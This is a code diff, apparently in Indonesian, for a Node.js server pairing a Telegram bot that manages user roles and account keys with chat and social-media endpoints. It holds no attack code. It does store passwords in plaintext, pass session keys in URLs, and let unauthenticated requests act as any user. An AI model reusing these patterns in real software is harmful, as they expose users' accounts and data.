+        if (args.length < 2) return sendWithPhoto(chatId, "❌ Gunakan `target_id|role` jika tidak mereply.");
+        targetTelegramId = parseInt(args[0].trim());
+        targetRole = args[1].trim().toLowerCase();
+    }
+
+    if (!targetTelegramId || isNaN(targetTelegramId) || !validRoles.includes(targetRole)) {
+        return sendWithPhoto(chatId, "❌ Parameter atau target ID/Role tidak valid.");
+    }
+
+    const creatorRole = getUserRoleFromDatabase(userId) || 'full up';
+    if (userId !== OWNER_ID && !canCreateRole(creatorRole, targetRole)) {
+        return sendWithPhoto(chatId, `❌ Hak hierarki Anda tidak mencukupi.`);
+    }
+
+    const db = loadDatabase();
+    let user = db.users.find(u => u.telegramId === targetTelegramId);
+
+    if (user) {
+        user.role = targetRole;
+        saveDatabase(db);
+        sendWithPhoto(chatId, `✅ Role diperbarui ke *${targetRole.toUpperCase()}*`);
+    } else {
+        db.users.push({
+            username: `user_${targetTelegramId}`,
+            password: Math.floor(100000000 + Math.random() * 900000000).toString(), 
+            role: targetRole,
+            expiredDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString().split("T")[0],
+            telegramId: targetTelegramId,
+            createdAt: new Date().toISOString(),
+            createdBy: userId,
+            creatorRole: creatorRole
+        });
+        saveDatabase(db);
+        sendWithPhoto(chatId, `✅ Berhasil mendaftarkan akun role baru.`);
+    }
+});
+
+// ─── PERINTAH /listusers ────────────────────────────────────────────────
+bot.onText(/^\/listusers(?: (.+))?/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isTelegramAuthorized(userId, 'reseller')) return sendWithPhoto(chatId, "❌ Akses pengelola ditolak.");
+
+    const filterRole = match ? match[1]?.toLowerCase() : null;
+    const db = loadDatabaseCached();
+    let filteredUsers = (filterRole && filterRole !== 'all') ? db.users.filter(u => u.role === filterRole) : db.users;
+
+    if (filteredUsers.length === 0) return sendWithPhoto(chatId, `📋 Tidak ada user ditemukan.`);
+    filteredUsers.sort((a, b) => getRoleLevel(b.role) - getRoleLevel(a.role));
+
+    let message = `📋 DAFTAR USER SYSTEM\n\n`;
+    const emojis = {
+        creator: '👑', developer: '💻', staf: '👑', exec: '⭐', vvip: '💎', svip: '💜',
+        owner: '👑', ceo: '💼', mod: '🛡️', pt: '🔧',
+        reseller: '💰', 'full up': '👤'
+    };
+    filteredUsers.forEach(u => {
+        message += `${emojis[u.role] || '👤'} ${u.username} | ${u.role.toUpperCase()} | Exp: ${u.expiredDate}\n`;
+    });
+    sendWithPhoto(chatId, message);
+});
+
+// ─── PERINTAH /deluser ────────────────────────────────────────────────
+bot.onText(/^\/deluser (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const username = match[1].trim();
+    if (!isTelegramAuthorized(userId, 'admin')) return sendWithPhoto(chatId, "❌ Hanya Admin yang dapat menghapus user.");
+
+    const db = loadDatabase();
+    const index = db.users.findIndex(u => u.username === username);
+    if (index === -1) return sendWithPhoto(chatId, "❌ User tidak ditemukan.");
+
+    db.users.splice(index, 1);
+    saveDatabase(db);
+    sendWithPhoto(chatId, `✅ User *${username}* berhasil dihapus.`);
+});
+
+// ─── PERINTAH /setrole ──────────────────────────────────────────────────
+bot.onText(/^\/setrole (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const [username, newRole] = match[1].trim().split('|');
+    if (!isTelegramAuthorized(userId, 'admin') || !username || !newRole) return;
+
+    const db = loadDatabase();
+    const user = db.users.find(u => u.username === username);
+    if (!user) return sendWithPhoto(chatId, "❌ User tidak ditemukan.");
+
+    user.role = newRole.toLowerCase();
+    saveDatabase(db);
+    sendWithPhoto(chatId, `✅ Role *${username}* diubah menjadi *${newRole.toUpperCase()}*`);
+});
+
+// ─── PERINTAH /hierarchy ────────────────────────────────────────────────
+bot.onText(/^\/hierarchy/, async (msg) => {
+    sendWithPhoto(msg.chat.id, `📊 ROLE HIERARCHY SYSTEM\n\n👑 CREATOR ➔ 💻 DEVELOPER ➔ 🛡️ STAF ➔ ⭐ EXEC ➔ 💎 VVIP ➔ 💜 SVIP ➔ 👑 OWNER ➔ 💼 CEO ➔ 🔧 MOD ➔ 🛠️ PT ➔ 💰 RESELLER ➔ 👤 FULL UP`);
+});
+
+// ─── PERINTAH /myrole ───────────────────────────────────────────────────
+bot.onText(/^\/myrole/, async (msg) => {
+    const role = getUserRoleFromDatabase(msg.from.id) || 'Tidak terdaftar';
+    sendWithPhoto(msg.chat.id, `👤 Role Anda: ${role.toUpperCase()}\n🆔 ID Telegram: ${msg.from.id}`);
+});
+
+// ─── PERINTAH /start UNTUK GROUP ──────────────────────────────────────────
+bot.onText(/^\/start$/, async (msg) => {
+    const chatId = msg.chat.id;
+    if (!isGroupChat(chatId)) return;
+
+    const name = msg.from.first_name || 'Tidak Diketahui';
+    const now = new Date();
+    const hari = hariText || now.toLocaleDateString('id-ID', { weekday: 'long' });
+    const tanggal = tanggalText || now.toLocaleDateString('id-ID', { day: 'numeric', month: 'long', year: 'numeric' });
+    const owner = telegramConfig.ownerUsername || 'Chs_Caze';
+    const channel = telegramConfig.channelUsername || 'AgungPride16';
+    const botUser = telegramConfig.botUsername || 'scarrydeathckey_bot';
+
+    const caption = 
+`——————LU SAPA MPRUY——————
+name : ${name}
+hari : ${hari}
+tanggal : ${tanggal}
+owner : @${owner}
+channel : @${channel}
+
+———————TUTOR CKEY———————
+START BOT TERLEBIH DAHULU
+BOT : @${botUser}
+KHUSUS FULL UP
+/ckey,name,999d,id_tele
+
+KHUSUS ROLE RESELLER - STAF
+/ckey,name,role,999d,id_tele
+
+TERIMA KASIH TELAH MENGGUNAKAN BOT 
+
+——————TERIMA KASIH———————`;
+
+    await sendWithPhoto(chatId, caption);
+});
+
+// ─── PERINTAH /helpall ──────────────────────────────────────────────────
+bot.onText(/^\/helpall/, async (msg) => {
+    const userId = msg.from.id;
+    const userRole = getUserRoleFromDatabase(userId) || 'full up';
+    let help = `📚 VEXORV BOT COMMANDS\n\n📡 General Commands:\n/myrole, /hierarchy, /cektitle\n\n`;
+    help += `👥 Public Management (semua orang bisa, 1x per ID):\n`;
+    help += `/ckey,username,durasi_hari,id_telegram (role otomatis full up)\n`;
+    help += `/ckey,username,role,durasi_hari,id_telegram (role bisa staf/exec/vvip/svip/owner/ceo/mod/pt/reseller/full up)\n\n`;
+    help += `📋 User Management (admin/owner):\n`;
+    help += `/listuser - Tampilkan semua user\n`;
+    help += `/listusers [role] - Tampilkan user dengan filter role\n`;
+    help += `/delkey,username - Hapus user berdasarkan username\n`;
+    help += `/deluser username - Hapus user (sama dengan delkey)\n`;
+    help += `/addrole - Tambah/ubah role user\n`;
+    help += `/setrole username|role - Ubah role user\n\n`;
+    help += `🚫 Ban Management (admin/owner):\n/ban,username - Ban user (tidak bisa /ckey)\n`;
+    help += `/unban,username - Unban user\n`;
+    help += `/listban - Lihat daftar banned\n\n`;
+    if (['creator', 'developer', 'staf', 'exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt', 'reseller'].includes(userRole)) {
+        help += `💰 Admin Management:\n/listusers, /addrole, /setrole\n\n`;
+    }
+    if (['creator', 'developer', 'staf', 'exec', 'vvip', 'svip', 'owner', 'ceo', 'mod', 'pt'].includes(userRole)) {
+        help += `📌 Info Management:\n/setinformasi, /infomasi, /tanggal, /hari\n`;
+    }
+    await sendWithPhoto(msg.chat.id, help);
+});
+
+// ========== CALLBACK QUERY HANDLER ==========
+bot.on('callback_query', async (query) => {
+    const id = query.from.id;
+    const data = query.data;
+
+    const config = loadTelegramConfig();
+    const isOwner = config.ownerList.includes(id);
+    const isUser = config.userList.includes(id) || isOwner;
+
+    if (!isUser) {
+        await bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
+        return;
+    }
+
+    switch (data) {
+        case "create_member":
+            bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
+            bot.once("message", msg => {
+                const [username, password, day] = msg.text.split("|");
+                const db = loadDatabase();
+                if (db.users.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
+                const expired = new Date();
+                expired.setDate(expired.getDate() + parseInt(day));
+                db.users.push({ username, password, role: "full up", expiredDate: expired.toISOString().split("T")[0] });
+                saveDatabase(db);
+                bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
+            });
+            break;
+
+        case "set_expire":
+            bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
+            bot.once("message", msg => {
+                const [username, addDays] = msg.text.split("|");
+                const db = loadDatabase();
+                const user = db.users.find(u => u.username === username);
+                if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");
+
+                const config = loadTelegramConfig();
+                const isOwner = config.ownerList.includes(id);
+
+                if (!isOwner && user.role !== "full up") {
+                    return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'full up'.");
+                }
+
+                const current = new Date(user.expiredDate);
+                current.setDate(current.getDate() + parseInt(addDays));
+                user.expiredDate = current.toISOString().split("T")[0];
+                saveDatabase(db);
+                bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
+            });
+            break;
+
+        case "list_user":
+            if (!isOwner) return;
+            const users = getFormattedUsers();
+            bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
+            break;
+
+        case "create_custom":
+            if (!isOwner) return;
+            bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
+            bot.once("message", msg => {
+                const [username, password, role, day] = msg.text.split("|");
+                const db = loadDatabase();
+                if (db.users.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
+                const expired = new Date();
+                expired.setDate(expired.getDate() + parseInt(day));
+                db.users.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
+                saveDatabase(db);
+                bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
+            });
+            break;
+
+        case "delete_user":
+            if (!isOwner) return;
+            bot.sendMessage(id, "Masukkan username yang akan dihapus:");
+            bot.once("message", msg => {
+                const db = loadDatabase();
+                const index = db.users.findIndex(u => u.username === msg.text);
+                if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
+                const deleted = db.users.splice(index, 1)[0];
+                saveDatabase(db);
+                bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
+            });
+            break;
+
+        default:
+            await bot.answerCallbackQuery(query.id, { text: "Perintah tidak dikenal." });
+    }
+});
+
+// ========== CORE LOGIC UTILITIES & EXPRESS ENDPOINTS ==========
+function validateUserAccess(username, password) {
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.username === username && u.password === password);
+    if (!user) return { success: false, message: "Username atau password salah" };
+    const today = new Date().toISOString().split("T")[0];
+    if (user.expiredDate < today) return { success: false, message: "Akun Anda sudah expired" };
+    return { success: true, user };
+}
+
+async function appendLogAsync(filePath, data) {
+  try {
+    if (fs.existsSync(filePath)) {
+      const stats = fs.statSync(filePath);
+      if (stats.size > 5 * 1024 * 1024) fs.writeFileSync(filePath, '');
+    }
+    await fsPromises.appendFile(filePath, data);
+  } catch (err) {
+    console.error(err.message);
+  }
+}
+
+const PUBLIC_CHAT_FILE = path.join(__dirname, 'public_chat.json');
+function loadPublicChat() {
+    if (fs.existsSync(PUBLIC_CHAT_FILE)) {
+        try { return JSON.parse(fs.readFileSync(PUBLIC_CHAT_FILE, 'utf8')); } catch (e) { return []; }
+    }
+    return [];
+}
+function savePublicChat(data) { fs.writeFileSync(PUBLIC_CHAT_FILE, JSON.stringify(data, null, 2)); }
+
+app.post("/get-public-chat", (req, res) => {
+    return res.status(200).json({ success: true, messages: loadPublicChat().slice(-50) });
+});
+
+app.post("/send-public-chat", (req, res) => {
+    const { username, message } = req.body;
+    if (!username || !message) return res.status(400).json({ success: false });
+    const currentChats = loadPublicChat();
+    currentChats.push({ username: sanitize(username), message: sanitize(message), time: new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' }) });
+    savePublicChat(currentChats);
+    return res.status(200).json({ success: true });
+});
+
+function getUserByKey(key) {
+  try {
+    const sessionList = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
+    return sessionList.find(e => e.sessionKey === key)?.username || null;
+  } catch (e) { return null; }
+}
+
 const onlineUsers = new Set();
 
-wss.on('connection', function (ws, req) {
+// =========================================================================
+// WEBSOCKET SERVER HANDLER
+// =========================================================================
+wss.on('connection', function (ws) {
   let username;
-
-  function broadcastStats() {
-    const stats = JSON.stringify({
-      type: 'stats',
-      onlineUsers: onlineUsers.size,
-      activeConnections: wss.clients.size,
-    });
-    wss.clients.forEach((client) => {
-      if (client.readyState === 1) {
-        client.send(stats);
-      }
-    });
+  async function broadcastStats() {
+    try {
+      const cpu = await si.currentLoad();
+      const mem = await si.mem();
+      const fsSize = await si.fsSize();
+      const stats = JSON.stringify({
+        type: 'stats',
+        onlineUsers: onlineUsers.size,
+        activeConnections: wss.clients.size,
+        cpu: `${cpu.currentLoad.toFixed(1)}%`,
+        ram: `${((mem.active / mem.total) * 100).toFixed(1)}%`,
+        disk: `${fsSize[0] ? fsSize[0].use.toFixed(1) : '0.0'}%`
+      });
+      wss.clients.forEach(c => { if (c.readyState === 1) c.send(stats); });
+    } catch (e) {}
   }
 
   ws.on('message', function (msg) {
     try {
       const data = JSON.parse(msg);
+      
+      if (data.type === 'auth') {
+        const session = JSON.parse(fs.readFileSync(KEY_FILE, "utf8"));
+        const validKey = session.find(e => e.sessionKey === data.key);
+        if (!validKey) {
+          ws.send(JSON.stringify({ type: 'auth', valid: false }));
+          return ws.close();
+        }
+        ws.username = validKey.username;
+        onlineUsers.add(ws.username);
+        broadcastStats();
+        ws.send(JSON.stringify({ type: 'auth', valid: true, username: ws.username }));
+        return;
+      }
 
       if (data.type === 'stats') {
         broadcastStats();
+        return;
       }
-
-      if (data.type === 'sessionCheck') {
-        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
-        const user = sessionList.find(e => e.sessionKey === data.key);
-
-        if (!user) {
-          ws.send(JSON.stringify({
-            type: "forceLogout",
-            reason: "Invalid key"
-          }));
-          return ws.close();
-        }
-
-        if (user.androidId !== data.androidId) {
-          ws.send(JSON.stringify({
-            type: "forceLogout",
-            reason: "Another device has logged in"
-          }));
-          return ws.close();
-        }
-      }
-
-      if (data.type === 'validate') {
-        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
-        const validKey = session.find(e => e.sessionKey === data.key);
-        const validId = session.find(e => e.androidId === data.androidId);
-
-        if (!validKey) {
-          ws.send(JSON.stringify({
-            type: "myInfo",
-            valid: false,
-            reason: "keyInvalid"
-          }));
-          return ws.close();
-        }
-
-        if (!validId) {
-          ws.send(JSON.stringify({
-            type: "myInfo",
-            valid: false,
-            reason: "androidIdMismatch"
-          }));
-          return ws.close();
-        }
-
-        const userInfo = session.find(e => e.sessionKey === data.key);
-        ws.username = userInfo?.username || data.key;
-        onlineUsers.add(ws.username);
-        broadcastStats();
-
-        ws.send(JSON.stringify({
-          type: "myInfo",
-          valid: true,
-          username: userInfo?.username,
-          androidId: userInfo?.androidId,
-          role: userInfo?.role || "member"
-        }));
-
-        const interval = setInterval(() => {
-          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
-          const validKey = session.find(e => e.sessionKey === data.key);
-          const validId = session.find(e => e.androidId === data.androidId);
-
-          if (!validKey) {
-            ws.send(JSON.stringify({
-              type: "myInfo",
-              valid: false,
-              reason: "keyInvalid"
-            }));
-            clearInterval(interval);
-            return ws.close();
-          }
-
-          if (!validId) {
-            ws.send(JSON.stringify({
-              type: "myInfo",
-              valid: false,
-              reason: "androidIdMismatch"
-            }));
-            clearInterval(interval);
-            return ws.close();
-          }
-
-        }, 10000);
-
-        ws.interval = interval;
-      }
-
-      if (data.type === 'auth') {
-        username = getUserByKey(data.key);
-        console.log(username);
-        if (!username) return ws.close();
-        wsClients[username] = ws;
-
-        const list = chatList
-          .filter(m => m.from === username || m.to === username)
-          .map(m => (m.from === username ? m.to : m.from));
-
-        ws.send(JSON.stringify({
-          type: "chatList",
-          users: [...new Set(list)],
-        }));
-      }
-
-      if (data.type === 'chat') {
-        const to = data.to;
-        const message = sanitize(data.message);
-        if (!username || !to || !message || message.length > 250) return;
-
-        const chat = {
-          from: username,
-          to,
-          message,
-          time: new Date().toISOString()
-        };
-        chatList.push(chat);
-        saveChat();
-
-        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));
-
-        if (wsClients[to]) {
-          wsClients[to].send(JSON.stringify({
-            type: 'chat',
-            message: { ...chat, fromMe: false }
-          }));
-        }
-      }
-
-      if (data.type === 'getMessages') {
-        const withUser = data.with;
-        const messages = chatList
-          .filter(m =>
-            (m.from === username && m.to === withUser) ||
-            (m.from === withUser && m.to === username)
-          )
-          .map(m => ({
-            ...m,
-            fromMe: m.from === username
-          }));
-
-        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
-      }
-
-    } catch (e) {
-      console.error("WS error:", e.message);
-    }
+    } catch (e) {}
   });
 
   ws.on('close', () => {
-    if (ws.username) {
-      onlineUsers.delete(ws.username);
-      broadcastStats();
-    }
-    if (ws.interval) clearInterval(ws.interval);
-    if (username && wsClients[username]) {
-      delete wsClients[username];
-    }
+    if (ws.username) onlineUsers.delete(ws.username);
+    broadcastStats();
   });
 });
 
-const domain = config.DOMAIN;
-const wsPort = config.WS_PORT;
-server.listen(wsPort, () => {
-  console.log(`🟣 Server running on http://${domain}:${wsPort}`);
+// ========== FUNGSI CHAT (LOAD/SAVE) ==========
+function loadChat() {
+    if (fs.existsSync(CHAT_FILE)) {
+        try {
+            return JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
+        } catch (e) { return []; }
+    }
+    return [];
+}
+
+function saveChat() {
+    fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
+}
+
+chatList = loadChat();
+
+function getUserProfile(username) {
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.username === username);
+    if (user) {
+        return {
+            username: user.username,
+            name: user.username,
+            role: user.role || 'full up',
+        };
+    }
+    return null;
+}
+
+// ─── API ENDPOINTS CHAT ──────────────────────────────────────────
+
+app.get('/chat/profile', (req, res) => {
+    const { key } = req.query;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const profile = getUserProfile(keyInfo.username);
+    if (!profile) return res.json({ valid: false, message: 'User not found' });
+    res.json({ valid: true, profile });
 });
 
-const PORT = config.PORT;
+app.get('/chat/global/messages', (req, res) => {
+    const { key, limit } = req.query;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const limitNum = parseInt(limit) || 100;
+    const messages = chatList
+        .filter(m => m.to === 'public' || m.to === null || m.to === undefined)
+        .slice(-limitNum)
+        .map(m => {
+            const senderProfile = getUserProfile(m.from);
+            return {
+                id: m.id,
+                sender: m.from,
+                senderProfile: senderProfile || { username: m.from, name: m.from },
+                message: m.message,
+                replyTo: m.replyTo || null,
+                timestamp: m.timestamp || m.created_at || new Date().toISOString()
+            };
+        });
+    res.json({ valid: true, messages });
+});
+
+app.post('/chat/global/send', (req, res) => {
+    const { key } = req.query;
+    const { message, replyTo } = req.body;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    if (!message || message.trim() === '') return res.json({ valid: false, message: 'Message empty' });
+    
+    const chat = {
+        id: Date.now().toString(),
+        from: keyInfo.username,
+        to: 'public',
+        message: message.trim(),
+        replyTo: replyTo || null,
+        timestamp: new Date().toISOString(),
+        created_at: new Date().toISOString(),
+        read: true
+    };
+    chatList.push(chat);
+    saveChat();
+    
+    const payload = JSON.stringify({
+        type: 'global_message',
+        message: chat
+    });
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN && client.username) {
+            client.send(payload);
+        }
+    });
+    
+    res.json({ valid: true, status: 'sent' });
+});
+
+app.get('/chat/private/users', (req, res) => {
+    const { key } = req.query;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const username = keyInfo.username;
+    const involved = chatList.filter(m => m.from === username || m.to === username);
+    const usersSet = new Set();
+    involved.forEach(m => {
+        if (m.from === username && m.to !== 'public') usersSet.add(m.to);
+        if (m.to === username && m.from !== 'public') usersSet.add(m.from);
+    });
+    const userList = Array.from(usersSet).map(u => {
+        const profile = getUserProfile(u);
+        const lastMsg = chatList.filter(m => (m.from === username && m.to === u) || (m.from === u && m.to === username))
+            .sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
+        return {
+            username: u,
+            profile: profile || { username: u, name: u },
+            lastMessage: lastMsg ? {
+                sender: lastMsg.from,
+                message: lastMsg.message,
+                timestamp: lastMsg.timestamp,
+                read: lastMsg.read || false
+            } : null
+        };
+    });
+    res.json({ valid: true, users: userList });
+});
+
+app.get('/chat/private/messages/:withUser', (req, res) => {
+    const { key, limit } = req.query;
+    const withUser = req.params.withUser;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const username = keyInfo.username;
+    const limitNum = parseInt(limit) || 100;
+    const messages = chatList
+        .filter(m => (m.from === username && m.to === withUser) || (m.from === withUser && m.to === username))
+        .slice(-limitNum)
+        .map(m => ({
+            id: m.id,
+            sender: m.from,
+            receiver: m.to,
+            message: m.message,
+            replyTo: m.replyTo || null,
+            fromMe: m.from === username,
+            read: m.read || false,
+            timestamp: m.timestamp
+        }));
+    res.json({ valid: true, messages });
+});
+
+app.post('/chat/private/send/:withUser', (req, res) => {
+    const { key } = req.query;
+    const withUser = req.params.withUser;
+    const { message, replyTo } = req.body;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    if (!message || message.trim() === '') return res.json({ valid: false, message: 'Message empty' });
+    
+    const chat = {
+        id: Date.now().toString(),
+        from: keyInfo.username,
+        to: withUser,
+        message: message.trim(),
+        replyTo: replyTo || null,
+        timestamp: new Date().toISOString(),
+        created_at: new Date().toISOString(),
+        read: false
+    };
+    chatList.push(chat);
+    saveChat();
+    
+    const payload = JSON.stringify({
+        type: 'private_message',
+        message: chat
+    });
+    wss.clients.forEach(client => {
+        if (client.readyState === WebSocket.OPEN && client.username) {
+            if (client.username === keyInfo.username || client.username === withUser) {
+                client.send(payload);
+            }
+        }
+    });
+    
+    res.json({ valid: true, status: 'sent' });
+});
+
+app.post('/chat/private/mark-read/:withUser', (req, res) => {
+    const { key } = req.query;
+    const withUser = req.params.withUser;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const username = keyInfo.username;
+    chatList.forEach(m => {
+        if (m.from === withUser && m.to === username && m.read === false) {
+            m.read = true;
+        }
+    });
+    saveChat();
+    res.json({ valid: true });
+});
+
+app.get('/chat/search-users', (req, res) => {
+    const { key, q } = req.query;
+    const keyInfo = activeKeys[key];
+    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
+    const query = q ? q.trim().toLowerCase() : '';
+    if (query.length < 2) return res.json({ valid: true, users: [] });
+    const db = loadDatabaseCached();
+    const users = db.users
+        .filter(u => u.username.toLowerCase().includes(query))
+        .map(u => ({
+            username: u.username,
+            profile: {
+                username: u.username,
+                name: u.username,
+                role: u.role || 'full up'
+            },
+            role: u.role || 'full up'
+        }));
+    res.json({ valid: true, users });
+});
+
+// ─── API ENDPOINTS SOSIAL MEDIA ──────────────────────────────────
+
+// GET ALL POSTS
+app.get('/api/posts', (req, res) => {
+  try {
+    const db = loadDatabaseCached();
+    const posts = db.posts
+      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
+      .map(post => ({
+        ...post,
+        likes: post.likes?.length || 0,
+        comments: post.comments || []
+      }));
+    res.json(posts);
+  } catch (error) {
+    console.error('[API] Error fetching posts:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET POSTS BY USER
+app.get('/api/posts/user/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const posts = db.posts
+      .filter(p => p.userId === userId || p.username === userId)
+      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
+    res.json(posts);
+  } catch (error) {
+    console.error('[API] User posts error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET POST DETAIL
+app.get('/api/posts/:postId', (req, res) => {
+  try {
+    const postId = req.params.postId;
+    const db = loadDatabaseCached();
+    const post = db.posts.find(p => p.id === postId);
+    if (!post) {
+      return res.status(404).json({ error: 'Post not found' });
+    }
+    res.json(post);
+  } catch (error) {
+    console.error('[API] Post detail error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET ALL USERS
+app.get('/api/users', (req, res) => {
+  try {
+    const db = loadDatabaseCached();
+    const users = db.users.map(({ password, ...user }) => user);
+    res.json(users);
+  } catch (error) {
+    console.error('[API] Error fetching users:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET USER BY ID
+app.get('/api/user/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    const { password, ...safeUser } = user;
+    res.json(safeUser);
+  } catch (error) {
+    console.error('[API] User detail error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// SEARCH USERS
+app.get('/api/search/:query', (req, res) => {
+  try {
+    const query = req.params.query?.toLowerCase().trim() || '';
+    if (query.length < 2) {
+      return res.json([]);
+    }
+    const db = loadDatabaseCached();
+    const results = db.users
+      .filter(u => 
+        u.username.toLowerCase().includes(query) || 
+        (u.name && u.name.toLowerCase().includes(query))
+      )
+      .map(({ password, ...user }) => user)
+      .slice(0, 20);
+    res.json(results);
+  } catch (error) {
+    console.error('[API] Search error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET FOLLOWERS
+app.get('/api/followers/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    const followers = db.users
+      .filter(u => (user.followers || []).includes(u.id))
+      .map(({ password, ...u }) => u);
+    res.json(followers);
+  } catch (error) {
+    console.error('[API] Followers error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET FOLLOWING
+app.get('/api/following/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    const following = db.users
+      .filter(u => (user.following || []).includes(u.id))
+      .map(({ password, ...u }) => u);
+    res.json(following);
+  } catch (error) {
+    console.error('[API] Following error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET SUGGESTED USERS
+app.get('/api/suggested/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    const suggested = db.users
+      .filter(u => 
+        u.id !== user.id && 
+        !(user.following || []).includes(u.id)
+      )
+      .map(({ password, ...u }) => u)
+      .slice(0, 10);
+    res.json(suggested);
+  } catch (error) {
+    console.error('[API] Suggested error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// GET USER POSTS COUNT
+app.get('/api/posts/count/:userId', (req, res) => {
+  try {
+    const userId = req.params.userId;
+    const db = loadDatabaseCached();
+    const count = db.posts.filter(p => p.userId === userId || p.username === userId).length;
+    res.json({ count });
+  } catch (error) {
+    console.error('[API] Posts count error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// ─── API ENDPOINTS (POST) ─────────────────────────────────────────
+
+// FOLLOW/UNFOLLOW
+app.post('/api/follow', async (req, res) => {
+  try {
+    const { userId, targetId } = req.body;
+    
+    if (!userId || !targetId) {
+      return res.status(400).json({ error: 'userId and targetId required' });
+    }
+    
+    if (userId === targetId) {
+      return res.status(400).json({ error: 'Cannot follow yourself' });
+    }
+
+    const db = loadDatabase();
+    const user = db.users.find(u => u.id === userId || u.username === userId);
+    const target = db.users.find(u => u.id === targetId || u.username === targetId);
+    
+    if (!user || !target) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+
+    if (!user.following) user.following = [];
+    if (!target.followers) target.followers = [];
+
+    const isFollowing = user.following.includes(target.id);
+    
+    if (isFollowing) {
+      user.following = user.following.filter(id => id !== target.id);
+      target.followers = target.followers.filter(id => id !== user.id);
+    } else {
+      user.following.push(target.id);
+      target.followers.push(user.id);
+    }
+
+    writeDatabase(db);
+    
+    res.json({
+      success: true,
+      isFollowing: !isFollowing,
+      followingCount: user.following.length,
+      followersCount: target.followers.length
+    });
+  } catch (error) {
+    console.error('[API] Follow error:', error);
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+// LIKE/UNLIKE
+app.post('/api/like', async (req, res) => {
+  try {
+    const { postId, userId } = req.body;
+    
+    if (!postId || !userId) {
+      return res.status(400).json({ error: 'postId and userId required' });
+    }
+
+    const db = loadDatabase();
+    const post = db.posts.find(p => p.id === postId);
+    
+    if (!post) {
